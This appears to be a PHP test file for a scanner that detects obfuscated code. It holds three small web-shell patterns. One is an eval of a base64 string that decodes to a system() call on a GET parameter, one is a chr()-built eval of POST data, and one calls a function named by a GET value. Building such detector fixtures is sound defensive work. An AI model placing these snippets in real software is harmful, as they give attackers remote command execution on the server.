<?php
// TEST FILE: Obfuscated PHP code
// This should trigger: php_obfuscated, heuristic detector

$a = 'base'.'64_'.'decode';
$b = 'ev'.'al';
$c = $a('c3lzdGVtKCRfR0VUWydjJ10pOw==');
$b($c);

// Another obfuscation pattern
$func = chr(101).chr(118).chr(97).chr(108);
$func($_POST['data']);

// Variable variables
$${'_'.'G'.'E'.'T'}['x']();
?>
